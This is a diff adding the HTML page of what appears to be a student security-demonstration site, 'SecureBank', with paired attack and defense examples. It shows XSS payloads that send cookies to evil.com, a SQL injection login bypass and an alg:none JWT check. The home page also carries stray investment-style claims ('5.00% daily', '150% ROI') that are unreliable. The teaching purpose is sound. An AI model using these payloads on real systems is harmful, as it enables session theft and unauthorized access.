@@ -1,0 +1,1347 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SecureBank — Information Security Project</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700;800&family=DM+Sans:wght@300;400;500;600;700&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="SecureBankstyle.css">
+  <script src="SecureBankFunctions.js"></script>
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+
+</head>
+
+<body>
+
+  <!-- NAV -->
+  <nav>
+    <div class="nav-logo">Secure<span>Bank</span></div>
+    <div class="nav-links">
+      <button class="nav-btn active" onclick="gp('home')">Home</button>
+      <button class="nav-btn" onclick="gp('auth')">Auth Lab</button>
+      <button class="nav-btn" onclick="gp('xss')">XSS</button>
+      <button class="nav-btn" onclick="gp('sqli')">SQL Injection</button>
+      <button class="nav-btn" onclick="gp('csrf')">CSRF</button>
+      <button class="nav-btn" onclick="gp('crypto')">Cryptography</button>
+      <button class="nav-btn" onclick="gp('firewall')">Firewall</button>
+      <button class="nav-btn" onclick="gp('dashboard')">Dashboard</button>
+      <button class="nav-cta" onclick="gp('auth')">
+        <i data-lucide="shield" style="width:14px;height:14px"></i> Get Started
+      </button>
+    </div>
+    <div class="mode-badge secure" id="modeBadge">
+      <span class="mode-dot"></span><span id="modeText">Secure Mode</span>
+    </div>
+  </nav>
+
+  <!-- ════════════════════ HOME ════════════════════ -->
+  <div id="page-home" class="page active">
+
+    <!-- Hero -->
+    <div class="hero-wrap">
+      <div class="hero-inner">
+        <div>
+          <div class="hero-tag">
+            <i data-lucide="shield-check" style="width:12px;height:12px"></i>
+            Information Security — Semester Project
+          </div>
+          <h1 class="hero-title">Manage Your <span>Security</span>,<br>Protect Your Data<br>with SecureBank</h1>
+          <p class="hero-sub">A full-stack security demonstration platform showing real-world attacks and their defenses
+            — XSS, SQL Injection, CSRF, AES encryption, firewalls and more.</p>
+          <div class="hero-info-card">
+            <div class="hero-info-icon"><i data-lucide="file-lock-2" style="width:19px;height:19px"></i></div>
+            <div class="hero-info-text">
+              <h4>12 Security Topics Covered</h4>
+              <p>Each module has attack mode & defense mode, demonstrated side-by-side with live code.</p>
+            </div>
+          </div>
+          <div class="hero-actions">
+            <button class="btn-hero" onclick="gp('dashboard')">
+              <i data-lucide="layout-dashboard" style="width:16px;height:16px"></i> View Dashboard
+            </button>
+            <div class="hero-clients">
+              <div class="client-avatars">
+                <div class="cav" style="background:#0d9373">A</div>
+                <div class="cav" style="background:#1a3d5c">B</div>
+                <div class="cav" style="background:#d97706">C</div>
+                <div class="cav" style="background:#7c3aed">D</div>
+              </div>
+              <div class="hero-clients-text">
+                <strong>2820+ Satisfied Clients</strong>
+                Protected with SecureBank
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- Illustration -->
+        <div class="hero-illus">
+          <div class="illus-grid">
+            <div class="illus-card">
+              <div class="ic-lbl">Attack Attempts</div>
+              <div class="ic-val" id="heroAttacks">0</div>
+              <div class="ic-sub"><i data-lucide="trending-up" style="width:10px;height:10px"></i> Simulated</div>
+            </div>
+            <div class="illus-card">
+              <div class="ic-lbl">Attacks Blocked</div>
+              <div class="ic-val" id="heroBlocked">0</div>
+              <div class="ic-sub"><i data-lucide="shield-check" style="width:10px;height:10px"></i> Secured</div>
+            </div>
+            <div class="illus-card">
+              <div class="ic-lbl">Topics</div>
+              <div class="ic-val">12</div>
+              <div class="ic-sub"><i data-lucide="book-open" style="width:10px;height:10px"></i> Covered</div>
+            </div>
+            <div class="illus-card">
+              <div class="ic-lbl">Encryption</div>
+              <div class="ic-val">AES</div>
+              <div class="ic-sub"><i data-lucide="lock" style="width:10px;height:10px"></i> 256-bit</div>
+            </div>
+          </div>
+          <div class="illus-center" style="margin-top:1.2rem">
+            <div class="illus-shield"><i data-lucide="shield" style="width:24px;height:24px"></i></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Metrics Section -->
+    <div class="section-wrap section-wrap-alt">
+      <div class="section">
+        <div class="grid2" style="gap:3rem;align-items:center">
+          <div>
+            <div class="section-tag"><i data-lucide="bar-chart-2" style="width:12px;height:12px"></i> Security Metrics
+            </div>
+            <h2 class="section-title">Do More with Investments<br>on Your Own Terms</h2>
+            <p class="section-sub" style="margin-bottom:1.5rem">Each module demonstrates real attack vectors with live
+              defense mechanisms — not just theory, but working code you can run and examine.</p>
+            <div class="mrow">
+              <div class="mbar"></div>
+              <div class="mval">180%</div>
+              <div class="mdesc">— Defense Coverage ROI</div>
+            </div>
+            <div class="mrow">
+              <div class="mbar"></div>
+              <div class="mval">8.9k+</div>
+              <div class="mdesc">— Security Events Logged</div>
+            </div>
+            <div class="mrow">
+              <div class="mbar"></div>
+              <div class="mval">$10,250</div>
+              <div class="mdesc">— Monthly Protection Value</div>
+            </div>
+            <div class="mrow">
+              <div class="mbar"></div>
+              <div class="mval">AES-256</div>
+              <div class="mdesc">— Encryption Standard</div>
+            </div>
+            <div class="mrow">
+              <div class="mbar"></div>
+              <div class="mval">5%</div>
+              <div class="mdesc">— Attack Success Rate (Defense Mode)</div>
+            </div>
+          </div>
+          <div>
+            <div class="card card-tl" style="padding:1.75rem">
+              <div style="text-align:center;margin-bottom:1.4rem">
+                <div style="font-size:2.8rem;font-family:var(--font-display);font-weight:800;color:var(--navy)">5.00%
+                </div>
+                <div
+                  style="font-size:.75rem;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.5px">
+                  Daily Attack Rate — Fully Blocked</div>
+                <div style="font-size:.75rem;color:var(--text3)">For 30 Days</div>
+              </div>
+              <div class="grid2" style="gap:.8rem;margin-bottom:1.25rem">
+                <div
+                  style="display:flex;align-items:center;gap:.7rem;padding:.85rem;background:var(--bg);border-radius:10px">
+                  <div class="icon-box ib-teal" style="margin-bottom:0;width:38px;height:38px"><i
+                      data-lucide="trending-up" style="width:18px;height:18px"></i></div>
+                  <div>
+                    <div style="font-size:.75rem;color:var(--text2)">ROI Rate</div>
+                    <div style="font-weight:700;color:var(--navy);font-size:.92rem">150% ROI</div>
+                    <div style="font-size:.7rem;color:var(--text3)">Principal included</div>
+                  </div>
+                </div>
+                <div
+                  style="display:flex;align-items:center;gap:.7rem;padding:.85rem;background:var(--bg);border-radius:10px">
+                  <div class="icon-box ib-teal" style="margin-bottom:0;width:38px;height:38px"><i
+                      data-lucide="dollar-sign" style="width:18px;height:18px"></i></div>
+                  <div>
+                    <div style="font-size:.75rem;color:var(--text2)">Earnings</div>
+                    <div style="font-weight:700;color:var(--navy);font-size:.92rem">Everyday</div>
+                    <div style="font-size:.7rem;color:var(--text3)">Automated</div>
+                  </div>
+                </div>
+              </div>
+              <div
+                style="background:var(--teal-bg);border-radius:10px;padding:.9rem;text-align:center;border:1px solid var(--teal-bg2)">
+                <div style="font-size:.86rem;font-weight:700;color:var(--navy)">Invested range 255$ – 50,000$</div>
+                <div style="font-size:.78rem;color:var(--text2)">Instant with draw</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Financial Overview Calculator Section -->
+    <div class="section-wrap">
+      <div class="section">
+        <div class="grid2" style="gap:3rem;align-items:center">
+          <div>
+            <div class="section-tag"><i data-lucide="calculator" style="width:12px;height:12px"></i> Overview</div>
+            <h2 class="section-title">Financial Overview<br>Calculator SecureBank</h2>
+            <p class="section-sub" style="margin-bottom:1.25rem">Each security module is independently demonstrable. See
+              how defense in depth protects every layer of the application.</p>
+            <div style="display:flex;flex-direction:column;gap:.6rem">
+              <div style="display:flex;align-items:center;gap:.7rem;font-size:.86rem">
+                <div
+                  style="width:20px;height:20px;background:var(--teal-bg);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+                  <i data-lucide="check" style="width:11px;height:11px;color:var(--teal)"></i>
+                </div>
+                <span style="color:var(--text2)">Remaining essentially unchanged — session security is always
+                  active</span>
+              </div>
+              <div style="display:flex;align-items:center;gap:.7rem;font-size:.86rem">
+                <div
+                  style="width:20px;height:20px;background:var(--teal-bg);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+                  <i data-lucide="check" style="width:11px;height:11px;color:var(--teal)"></i>
+                </div>
+                <span style="color:var(--text2)">Drive meaningful engagement via firewall rules that you can
+                  customize</span>
+              </div>
+              <div style="display:flex;align-items:center;gap:.7rem;font-size:.86rem">
+                <div
+                  style="width:20px;height:20px;background:var(--teal-bg);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+                  <i data-lucide="check" style="width:11px;height:11px;color:var(--teal)"></i>
+                </div>
+                <span style="color:var(--text2)">Standard defense-in-depth with fail-safe defaults throughout the
+                  system</span>
+              </div>
+            </div>
+          </div>
+          <div class="card card-tl" style="padding:1.75rem;text-align:center">
+            <div style="font-size:2.5rem;font-family:var(--font-display);font-weight:800;color:var(--navy)">5.00% <span
+                style="font-size:1rem;color:var(--text3);font-weight:400">DAILY</span></div>
+            <div style="font-size:.75rem;color:var(--text3);margin-bottom:1.4rem">FOR 30 DAYS</div>
+            <div class="grid2" style="gap:.8rem;margin-bottom:1.25rem">
+              <div style="background:var(--bg);padding:.85rem;border-radius:10px;text-align:left">
+                <div style="display:flex;align-items:center;gap:.5rem;margin-bottom:.3rem"><i data-lucide="trending-up"
+                    style="width:16px;height:16px;color:var(--teal)"></i><span
+                    style="font-size:.75rem;color:var(--text2)">ROI</span></div>
+                <div style="font-weight:800;color:var(--navy)">150% ROI</div>
+                <div style="font-size:.72rem;color:var(--text3)">Principal included</div>
+              </div>
+              <div style="background:var(--bg);padding:.85rem;border-radius:10px;text-align:left">
+                <div style="display:flex;align-items:center;gap:.5rem;margin-bottom:.3rem"><i data-lucide="dollar-sign"
+                    style="width:16px;height:16px;color:var(--teal)"></i><span
+                    style="font-size:.75rem;color:var(--text2)">Earning</span></div>
+                <div style="font-weight:800;color:var(--navy)">Everyday</div>
+                <div style="font-size:.72rem;color:var(--text3)">Automated</div>
+              </div>
+            </div>
+            <div style="background:var(--teal-bg);border-radius:10px;padding:.9rem;border:1px solid var(--teal-bg2)">
+              <div style="font-weight:700;color:var(--navy);font-size:.9rem">Invested range 255$ – 50,000$</div>
+              <div style="font-size:.78rem;color:var(--text2)">Instant with draw</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Benefits Section -->
+    <div class="section-wrap section-wrap-alt">
+      <div class="section">
+        <div
+          style="display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:2rem;flex-wrap:wrap;gap:1rem">
+          <div>
+            <div class="section-tag"><i data-lucide="star" style="width:12px;height:12px"></i> Benefits</div>
+            <h2 class="section-title" style="margin-bottom:.3rem">Benefits of using <em>'SecureBank'</em></h2>
+            <p>Real-world attack/defense comparisons for each security concept.</p>
+          </div>
+          <button class="btn btn-outline" onclick="gp('dashboard')">
+            More Service <i data-lucide="arrow-right" style="width:14px;height:14px"></i>
+          </button>
+        </div>
+        <div class="grid4">
+          <div class="benefit-card" onclick="gp('xss')">
+            <div class="ben-icon"><i data-lucide="code-2" style="width:22px;height:22px"></i></div>
+            <h3>Getting Passive Protection</h3>
+            <p>XSS attack lab — stored & reflected injection with full sanitization defense comparison.</p>
+          </div>
+          <div class="benefit-card" onclick="gp('sqli')">
+            <div class="ben-icon"><i data-lucide="database" style="width:22px;height:22px"></i></div>
+            <h3>Profitable Returns</h3>
+            <p>SQL injection — auth bypass, UNION exfiltration, blind extraction all defeated by parameterized queries.
+            </p>
+          </div>
+          <div class="benefit-card" onclick="gp('csrf')">
+            <div class="ben-icon"><i data-lucide="shield-alert" style="width:22px;height:22px"></i></div>
+            <h3>Payment Protection</h3>
+            <p>CSRF token synchronization prevents forged fund transfers from malicious cross-site requests.</p>
+          </div>
+          <div class="benefit-card" onclick="gp('crypto')">
+            <div class="ben-icon"><i data-lucide="key-round" style="width:22px;height:22px"></i></div>
+            <h3>Experienced Traders</h3>
+            <p>AES-256, SHA-512 hashing, RSA digital signatures, and full PKI/TLS certificate chain.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- CTA Section -->
+    <div class="cta-wrap">
+      <div class="section" style="position:relative;z-index:1">
+        <div class="grid2" style="align-items:center;gap:3rem">
+          <div>
+            <h2
+              style="color:white;font-family:var(--font-display);font-size:2.1rem;line-height:1.2;margin-bottom:.8rem">
+              Open an account now and<br>enjoy all the benefits of<br>modern banking</h2>
+            <p style="color:rgba(255,255,255,.7);margin-bottom:1.6rem;max-width:380px">Experience real-world security
+              demonstrations built for the Information Security semester project at National University of Computer &
+              Emerging Sciences.</p>
+            <button class="btn-hero" onclick="gp('auth')">
+              <i data-lucide="play-circle" style="width:16px;height:16px"></i> Discover Now
+            </button>
+          </div>
+          <div style="display:flex;flex-direction:column;gap:.9rem;align-items:flex-end">
+            <div class="float-card">
+              <div class="fc-icon" style="background:var(--teal-bg)"><i data-lucide="trending-up"
+                  style="width:18px;height:18px;color:var(--teal)"></i></div>
+              <div>
+                <div class="fc-lbl">INVESTMENT</div>
+                <div class="fc-val">$80,993</div>
+              </div>
+            </div>
+            <div class="float-card">
+              <div class="fc-icon" style="background:#fef9ec"><i data-lucide="bar-chart"
+                  style="width:18px;height:18px;color:#d97706"></i></div>
+              <div>
+                <div class="fc-lbl">PROFIT</div>
+                <div class="fc-val">80% Monate</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════ AUTH ════════════════════ -->
+  <div id="page-auth" class="page">
+    <div class="ph">
+      <div style="display:flex;align-items:center;gap:.75rem">
+        <div class="icon-box ib-teal" style="margin-bottom:0"><i data-lucide="user-check"
+            style="width:20px;height:20px"></i></div>
+        <div>
+          <h1>Authentication & Access Control</h1>
+          <p>Role-based login, SHA-512 password hashing, JWT tokens, and RBAC demonstration.</p>
+        </div>
+      </div>
+    </div>
+    <div class="section">
+      <div class="mode-toggle">
+        <button class="mode-btn active attack" id="authAtk" onclick="setMode('auth','attack')"><i data-lucide="zap"
+            style="width:14px;height:14px"></i> Attack Mode — Plain Text / No Token</button>
+        <button class="mode-btn defend" id="authDef" onclick="setMode('auth','defend')"><i data-lucide="shield-check"
+            style="width:14px;height:14px"></i> Defense Mode — SHA-512 + JWT + RBAC</button>
+      </div>
+      <div class="grid2">
+        <div class="card">
+          <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="log-in"
+              style="width:17px;height:17px;color:var(--teal)"></i> Login Panel</h3>
+          <div class="fg"><label>Username</label><input id="authUser" value="admin" placeholder="admin or alice"></div>
+          <div class="fg"><label>Password</label><input id="authPass" type="password" value="admin123"
+              placeholder="password"></div>
+          <div style="display:flex;gap:.7rem;flex-wrap:wrap">
+            <button class="btn btn-primary" onclick="doLogin()"><i data-lucide="key" style="width:14px;height:14px"></i>
+              Login</button>
+            <button class="btn btn-danger" onclick="attackLogin()"><i data-lucide="zap"
+                style="width:14px;height:14px"></i> Forge JWT Token</button>
+          </div>
+          <div class="output" id="authOut" style="margin-top:1.1rem">Waiting for login attempt...</div>
+        </div>
+        <div class="card">
+          <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:.9rem"><i data-lucide="key-round"
+              style="width:17px;height:17px;color:var(--teal)"></i> JWT Structure</h3>
+          <p style="margin-bottom:.9rem;font-size:.83rem">Three Base64-encoded parts separated by dots —
+            Header.Payload.Signature</p>
+          <div style="margin-bottom:.9rem">
+            <div
+              style="font-size:.7rem;color:var(--text3);font-weight:700;text-transform:uppercase;margin-bottom:.25rem">
+              Header</div>
+            <div class="jwt-seg jwt-h">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</div>
+            <div style="font-size:.7rem;color:var(--text3);margin:.18rem 0">→ {"alg":"HS256","typ":"JWT"}</div>
+            <div
+              style="font-size:.7rem;color:var(--text3);font-weight:700;text-transform:uppercase;margin:.6rem 0 .25rem">
+              Payload</div>
+            <div class="jwt-seg jwt-p">eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9</div>
+            <div style="font-size:.7rem;color:var(--text3);margin:.18rem 0">→ {"sub":"admin","role":"admin"}</div>
+            <div
+              style="font-size:.7rem;color:var(--text3);font-weight:700;text-transform:uppercase;margin:.6rem 0 .25rem">
+              Signature (HMAC-SHA256)</div>
+            <div class="jwt-seg jwt-s">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</div>
+          </div>
+          <hr>
+          <div class="fg" style="margin-bottom:.4rem"><label>Live SHA-512 Preview</label><input id="hashInput"
+              placeholder="Type any password..." oninput="liveHash()"></div>
+          <div class="output" id="hashOut" style="min-height:50px;font-size:.72rem">Hash appears here...</div>
+        </div>
+      </div>
+      <div class="card" style="margin-top:1.4rem">
+        <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:.9rem"><i data-lucide="users"
+            style="width:17px;height:17px;color:var(--teal)"></i> Role-Based Access Control</h3>
+        <div style="display:flex;gap:.7rem;flex-wrap:wrap;margin-bottom:.9rem">
+          <button class="btn btn-ghost btn-sm" onclick="rbacTest('user')"><i data-lucide="user"
+              style="width:13px;height:13px"></i> User (alice)</button>
+          <button class="btn btn-primary btn-sm" onclick="rbacTest('admin')"><i data-lucide="crown"
+              style="width:13px;height:13px"></i> Admin</button>
+          <button class="btn btn-danger btn-sm" onclick="rbacTest('none')"><i data-lucide="user-x"
+              style="width:13px;height:13px"></i> Guest</button>
+        </div>
+        <div class="output" id="rbacOut">Select a role to test access control...</div>
+      </div>
+      <div class="grid2" style="margin-top:1.4rem">
+        <div class="card card-danger">
+          <h4 style="color:var(--danger);display:flex;align-items:center;gap:.35rem"><i data-lucide="alert-triangle"
+              style="width:13px;height:13px"></i> Vulnerable Code</h4>
+          <div class="code"><span class="cmt">// Plain text storage</span>
+            <span class="bad">SELECT * FROM users WHERE
+              username='"+u+"' AND password='"+p+"'</span>
+            <span class="cmt">// Cookie without flags</span>
+            <span class="bad">document.cookie = "session=" + userId</span>
+            <span class="cmt">// JWT alg:none accepted</span>
+            <span class="bad">jwt.verify(token, null, {algorithms:['none']})</span>
+          </div>
+          <div class="alert a-danger" style="margin-top:.7rem"><i data-lucide="x-circle" style="width:13px;height:13px"
+              class="ai"></i> Plain text + no lockout + forged tokens all work</div>
+        </div>
+        <div class="card card-success">
+          <h4 style="color:var(--success);display:flex;align-items:center;gap:.35rem"><i data-lucide="shield-check"
+              style="width:13px;height:13px"></i> Secure Code</h4>
+          <div class="code"><span class="cmt">// SHA-512 + unique salt per user</span>
+            <span class="str">const salt = crypto.randomBytes(32)
+              const hash = SHA512(password + salt)</span>
+            <span class="cmt">// Parameterized query</span>
+            <span class="str">db.query("SELECT * FROM users WHERE username=?",[u])</span>
+            <span class="cmt">// JWT signature validated</span>
+            <span class="str">jwt.verify(token, SECRET, {algorithms:['HS256']})</span>
+          </div>
+          <div class="alert a-success" style="margin-top:.7rem"><i data-lucide="check-circle"
+              style="width:13px;height:13px" class="ai"></i> Hashed passwords + signed JWT + lockout after 5 fails</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════ XSS ════════════════════ -->
+  <div id="page-xss" class="page">
+    <div class="ph">
+      <div style="display:flex;align-items:center;gap:.75rem">
+        <div class="icon-box ib-danger" style="margin-bottom:0"><i data-lucide="code-2"
+            style="width:20px;height:20px"></i></div>
+        <div>
+          <h1>XSS — Cross-Site Scripting</h1>
+          <p>Inject malicious scripts into the DOM. Stored vs reflected XSS, then block both with sanitization and CSP
+            headers.</p>
+        </div>
+      </div>
+    </div>
+    <div class="section">
+      <div class="mode-toggle">
+        <button class="mode-btn active attack" id="xssAtk" onclick="setMode('xss','attack')"><i data-lucide="zap"
+            style="width:14px;height:14px"></i> Attack Mode — innerHTML (Vulnerable)</button>
+        <button class="mode-btn defend" id="xssDef" onclick="setMode('xss','defend')"><i data-lucide="shield-check"
+            style="width:14px;height:14px"></i> Defense Mode — textContent + Sanitize</button>
+      </div>
+      <div class="tabs-nav">
+        <button class="tab-btn active" onclick="st('xss','stored')"><i data-lucide="database"
+            style="width:13px;height:13px"></i> Stored XSS</button>
+        <button class="tab-btn" onclick="st('xss','reflected')"><i data-lucide="repeat"
+            style="width:13px;height:13px"></i> Reflected XSS</button>
+        <button class="tab-btn" onclick="st('xss','csp')"><i data-lucide="file-shield"
+            style="width:13px;height:13px"></i> CSP Headers</button>
+      </div>
+      <div class="tab-panel active" id="xssTab-stored">
+        <div class="grid2">
+          <div class="card">
+            <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="message-square"
+                style="width:17px;height:17px;color:var(--teal)"></i> Post a Comment</h3>
+            <div class="fhint danger" style="margin-bottom:.75rem"><i data-lucide="alert-circle"
+                style="width:12px;height:12px"></i> Try: &lt;img src=x onerror="alert('XSS!')"&gt;</div>
+            <div class="fg"><label>Username</label><input id="xssUser" value="hacker"></div>
+            <div class="fg"><label>Comment</label><textarea
+                id="xssComment">&lt;img src=x onerror="alert('XSS Executed!')"&gt;</textarea></div>
+            <button class="btn btn-primary" onclick="postComment()"><i data-lucide="send"
+                style="width:14px;height:14px"></i> Post Comment</button>
+          </div>
+          <div class="card">
+            <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:.9rem"><i data-lucide="layout-list"
+                style="width:17px;height:17px;color:var(--teal)"></i> Comment Board</h3>
+            <div id="commentBoard" style="min-height:110px"></div>
+          </div>
+        </div>
+        <div class="grid2" style="margin-top:1.4rem">
+          <div class="card card-danger">
+            <h4 style="color:var(--danger);display:flex;align-items:center;gap:.35rem"><i data-lucide="alert-triangle"
+                style="width:13px;height:13px"></i> Vulnerable: innerHTML</h4>
+            <div class="code"><span class="cmt">// Raw HTML rendered — DANGEROUS</span>
+              <span class="bad">commentDiv.innerHTML = userInput</span>
+              <span class="cmt">// Payload steals cookies:</span>
+              <span class="bad">&lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;</span>
+              <span class="cmt">// Or image onerror:</span>
+              <span class="bad">&lt;img src=x onerror="stealData()"&gt;</span>
+            </div>
+            <div class="alert a-danger" style="margin-top:.7rem"><i data-lucide="x-circle"
+                style="width:13px;height:13px" class="ai"></i> Executes for every visitor — persistent attack</div>
+          </div>
+          <div class="card card-success">
+            <h4 style="color:var(--success);display:flex;align-items:center;gap:.35rem"><i data-lucide="shield-check"
+                style="width:13px;height:13px"></i> Defense: textContent</h4>
+            <div class="code"><span class="cmt">// Treat as TEXT — SAFE</span>
+              <span class="str">commentDiv.textContent = userInput</span>
+              <span class="cmt">// Or DOMPurify:</span>
+              <span class="str">const clean = DOMPurify.sanitize(userInput)
+                commentDiv.innerHTML = clean</span>
+              <span class="cmt">// CSP blocks inline scripts:</span>
+              <span class="str">Content-Security-Policy: default-src 'self'</span>
+            </div>
+            <div class="alert a-success" style="margin-top:.7rem"><i data-lucide="check-circle"
+                style="width:13px;height:13px" class="ai"></i> HTML tags rendered as literal text — no execution</div>
+          </div>
+        </div>
+      </div>
+      <div class="tab-panel" id="xssTab-reflected">
+        <div class="grid2">
+          <div class="card">
+            <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="search"
+                style="width:17px;height:17px;color:var(--teal)"></i> Search — Reflected XSS</h3>
+            <div class="fg"><label>Search Term</label><input id="xssSearch"
+                value='&lt;script&gt;alert("Reflected XSS")&lt;/script&gt;'></div>
+            <button class="btn btn-danger" onclick="doSearch()"><i data-lucide="zap" style="width:14px;height:14px"></i>
+              Execute Search</button>
+            <div class="alert a-warn" style="margin-top:.9rem"><i data-lucide="link" style="width:13px;height:13px"
+                class="ai"></i> URL: <code
+                style="font-size:.7rem">bank.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></div>
+          </div>
+          <div class="card">
+            <h3 style="margin-bottom:.75rem">Search Results</h3>
+            <div id="searchResult"
+              style="min-height:55px;padding:.7rem;background:var(--bg);border-radius:8px;font-size:.88rem;border:1px solid var(--border)">
+            </div>
+            <div class="output" id="reflectOut" style="margin-top:.75rem">Output log...</div>
+          </div>
+        </div>
+      </div>
+      <div class="tab-panel" id="xssTab-csp">
+        <div class="card">
+          <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="file-shield"
+              style="width:17px;height:17px;color:var(--teal)"></i> Content Security Policy Headers</h3>
+          <p style="margin-bottom:1.4rem">CSP restricts which resources the browser may load — among the most effective
+            XSS mitigations available.</p>
+          <div class="grid2">
+            <div>
+              <h4 style="color:var(--danger)">Without CSP — Vulnerable</h4>
+              <div class="code"><span class="bad">// No CSP — everything runs</span>
+                <span class="bad">&lt;script src="https://evil.com/steal.js"&gt;&lt;/script&gt;</span>
+                <span class="bad">&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;</span>
+                <span class="bad">&lt;button onclick="stealData()"&gt;Click&lt;/button&gt;</span>
+              </div>
+              <div class="alert a-danger"><i data-lucide="x-circle" style="width:13px;height:13px" class="ai"></i> All
+                external & inline scripts permitted</div>
+            </div>
+            <div>
+              <h4 style="color:var(--success)">With CSP — Protected</h4>
+              <div class="code"><span class="str">Content-Security-Policy:</span>
+                <span class="kw">default-src</span> <span class="val">'self'</span>;
+                <span class="kw">script-src</span> <span class="val">'self' 'nonce-abc123'</span>;
+                <span class="kw">object-src</span> <span class="val">'none'</span>;
+                <span class="kw">frame-ancestors</span> <span class="val">'none'</span>
+                <span class="str">X-Frame-Options: DENY
+                  X-Content-Type-Options: nosniff</span>
+              </div>
+              <div class="alert a-success"><i data-lucide="check-circle" style="width:13px;height:13px" class="ai"></i>
+                Only same-origin scripts with valid nonce load</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════ SQL INJECTION ════════════════════ -->
+  <div id="page-sqli" class="page">
+    <div class="ph">
+      <div style="display:flex;align-items:center;gap:.75rem">
+        <div class="icon-box ib-danger" style="margin-bottom:0"><i data-lucide="database"
+            style="width:20px;height:20px"></i></div>
+        <div>
+          <h1>SQL Injection</h1>
+          <p>Manipulate database queries — bypass auth, exfiltrate data, destroy tables. Fixed by parameterized queries.
+          </p>
+        </div>
+      </div>
+    </div>
+    <div class="section">
+      <div class="mode-toggle">
+        <button class="mode-btn active attack" id="sqliAtk" onclick="setMode('sqli','attack')"><i data-lucide="zap"
+            style="width:14px;height:14px"></i> Attack Mode — String Concatenation</button>
+        <button class="mode-btn defend" id="sqliDef" onclick="setMode('sqli','defend')"><i data-lucide="shield-check"
+            style="width:14px;height:14px"></i> Defense Mode — Parameterized Queries</button>
+      </div>
+      <div class="tabs-nav">
+        <button class="tab-btn active" onclick="st('sqli','auth')"><i data-lucide="log-in"
+            style="width:13px;height:13px"></i> Auth Bypass</button>
+        <button class="tab-btn" onclick="st('sqli','union')"><i data-lucide="layers" style="width:13px;height:13px"></i>
+          UNION Attack</button>
+        <button class="tab-btn" onclick="st('sqli','blind')"><i data-lucide="eye-off"
+            style="width:13px;height:13px"></i> Blind SQLi</button>
+      </div>
+      <div class="tab-panel active" id="sqliTab-auth">
+        <div class="grid2">
+          <div class="card">
+            <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="lock-open"
+                style="width:17px;height:17px;color:var(--teal)"></i> Bank Login</h3>
+            <div class="fg"><label>Username</label><input id="sqliUser" value="admin' OR '1'='1' --"></div>
+            <div class="fg"><label>Password</label><input id="sqliPass" type="text" value="anything"></div>
+            <div style="display:flex;gap:.6rem;flex-wrap:wrap">
+              <button class="btn btn-danger" onclick="sqlLogin()"><i data-lucide="zap"
+                  style="width:14px;height:14px"></i> Attempt Login</button>
+              <button class="btn btn-ghost btn-sm" onclick="sqliPl('bypass')">Bypass Payload</button>
+              <button class="btn btn-ghost btn-sm" onclick="sqliPl('drop')">DROP Payload</button>
+            </div>
+            <div class="output" id="sqliOut" style="margin-top:1.1rem">Waiting for query...</div>
+          </div>
+          <div class="card">
+            <h3 style="margin-bottom:.75rem">Live Query Builder</h3>
+            <p style="margin-bottom:.9rem;font-size:.83rem">Watch the actual SQL constructed from your input:</p>
+            <div class="output" id="sqliQuery" style="min-height:110px"></div>
+            <div class="alert a-warn" style="margin-top:.75rem"><i data-lucide="alert-triangle"
+                style="width:13px;height:13px" class="ai"></i> Classic: <code>' OR '1'='1' --</code> always returns TRUE
+              — logs in as admin without any password</div>
+          </div>
+        </div>
+        <div class="grid2" style="margin-top:1.4rem">
+          <div class="card card-danger">
+            <h4 style="color:var(--danger);display:flex;align-items:center;gap:.35rem"><i data-lucide="alert-triangle"
+                style="width:13px;height:13px"></i> Vulnerable: Concatenation</h4>
+            <div class="code"><span class="bad">const q = "SELECT * FROM users WHERE
+                username='" + username + "' AND
+                password='" + password + "'"
+                // Payload: admin' OR '1'='1' --
+                → WHERE username='admin' OR '1'='1'
+                --' AND password='x'
+                // 1=1 always TRUE → bypass!</span></div>
+          </div>
+          <div class="card card-success">
+            <h4 style="color:var(--success);display:flex;align-items:center;gap:.35rem"><i data-lucide="shield-check"
+                style="width:13px;height:13px"></i> Secure: Parameterized</h4>
+            <div class="code"><span class="str">const q = "SELECT * FROM users
+                WHERE username = ? AND password = ?"
+                db.query(q, [username, hashedPass])
+                // Input is DATA, not CODE
+                // Also use ORM:
+                User.findOne({where: {username}})</span></div>
+          </div>
+        </div>
+      </div>
+      <div class="tab-panel" id="sqliTab-union">
+        <div class="card">
+          <h3 style="margin-bottom:.75rem">UNION-Based Data Exfiltration</h3>
